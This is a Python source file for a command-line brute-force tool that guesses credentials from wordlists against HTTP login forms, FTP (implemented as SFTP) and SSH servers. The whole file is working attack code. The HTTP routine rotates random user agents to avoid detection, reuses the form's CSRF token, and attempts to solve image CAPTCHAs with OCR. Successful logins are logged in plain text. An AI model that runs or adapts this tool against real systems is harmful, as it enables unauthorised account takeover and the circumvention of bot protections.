import argparse
import json
import requests
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
import pytesseract
import threading
import time
import logging
import paramiko
import pysftp

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def http_brute_force(url, username_file, password_file, request_delay):
    # Read usernames and passwords into lists
    with open(username_file, "r") as f:
        usernames = f.read().splitlines()

    with open(password_file, "r") as f:
        passwords = f.read().splitlines()

    # User-agent generator
    ua = UserAgent()

    # GET request to the login page
    response = requests.get(url)
    html = response.text

    # Parse HTML content
    soup = BeautifulSoup(html, "html.parser")

    # Find the login form
    form = soup.find("form")

    # Find form field names
    fields = form.find_all("input")
    field_names = [field.get("name") for field in fields]

    # Find CSRF token or other hidden fields
    token_name = None
    token_value = None
    for field in fields:
        if field.get("type") == "hidden":
            token_name = field.get("name")
            token_value = field.get("value")
            break

    # Find CAPTCHA or other bot protection
    captcha_name = None
    captcha_value = None
    for field in fields:
        if field.get("type") == "image":
            captcha_name = field.get("name")
            captcha_url = url + "/" + field.get("src")
            captcha_image = requests.get(captcha_url).content
            captcha_value = pytesseract.image_to_string(captcha_image)
            break

    def try_login(username, password):
        user_agent = ua.random
        headers = {"User-Agent": user_agent}
        data = {field_names[0]: username, field_names[1]: password}
        if token_name and token_value:
            data[token_name] = token_value
        if captcha_name and captcha_value:
            data[captcha_name] = captcha_value
        
        try:
            response = requests.post(url, data=data, headers=headers)
            if "Başarısız" not in response.text and "Failed" not in response.text:
                logging.info(f"Found valid credentials: {username}:{password}")
                return True
            else:
                logging.info(f"Invalid credentials: {username}:{password}")
                return False
        except requests.RequestException as e:
            logging.error(f"Request error: {e}")
            return False

    def brute_force():
        for username in usernames:
            for password in passwords:
                result = try_login(username, password)
                if result:
                    return
                time.sleep(request_delay)

    thread = threading.Thread(target=brute_force)
    thread.start()
    thread.join()

def ftp_brute_force(host, username_file, password_file, port=21, request_delay=5):
    with open(username_file, "r") as f:
        usernames = f.read().splitlines()

    with open(password_file, "r") as f:
        passwords = f.read().splitlines()

    def try_login(username, password):
        try:
            with pysftp.Connection(host, username=username, password=password, port=port) as sftp:
                logging.info(f"Found valid credentials: {username}:{password}")
                return True
        except Exception as e:
            logging.info(f"Invalid credentials: {username}:{password} - {e}")
            return False

    for username in usernames:
        for password in passwords:
            result = try_login(username, password)
            if result:
                return
            time.sleep(request_delay)

def ssh_brute_force(host, username_file, password_file, port=22, request_delay=5):
    with open(username_file, "r") as f:
        usernames = f.read().splitlines()

    with open(password_file, "r") as f:
        passwords = f.read().splitlines()

    def try_login(username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=port, username=username, password=password)
            logging.info(f"Found valid credentials: {username}:{password}")
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            logging.info(f"Invalid credentials: {username}:{password}")
            return False
        except Exception as e:
            logging.error(f"Connection error: {e}")
            return False

    for username in usernames:
        for password in passwords:
            result = try_login(username, password)
            if result:
                return
            time.sleep(request_delay)

def main():
    parser = argparse.ArgumentParser(description='Brute force tool for HTTP, FTP, and SSH')
    parser.add_argument('--http', action='store_true', help='Use HTTP brute force')
    parser.add_argument('--ftp', action='store_true', help='Use FTP brute force')
    parser.add_argument('--ssh', action='store_true', help='Use SSH brute force')
    parser.add_argument('-u', '--username-file', required=True, help='Path to the username file')
    parser.add_argument('-P', '--password-file', required=True, help='Path to the password file')
    parser.add_argument('-h', '--host', required=True, help='Target host')
    parser.add_argument('-d', '--delay', type=int, default=5, help='Request delay in seconds')
    parser.add_argument('--port', type=int, help='Port number')

    args = parser.parse_args()

    if args.http:
        http_brute_force(args.host, args.username_file, args.password_file, args.delay)
    elif args.ftp:
        ftp_brute_force(args.host, args.username_file, args.password_file, port=args.port or 21, request_delay=args.delay)
    elif args.ssh:
        ssh_brute_force(args.host, args.username_file, args.password_file, port=args.port or 22, request_delay=args.delay)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
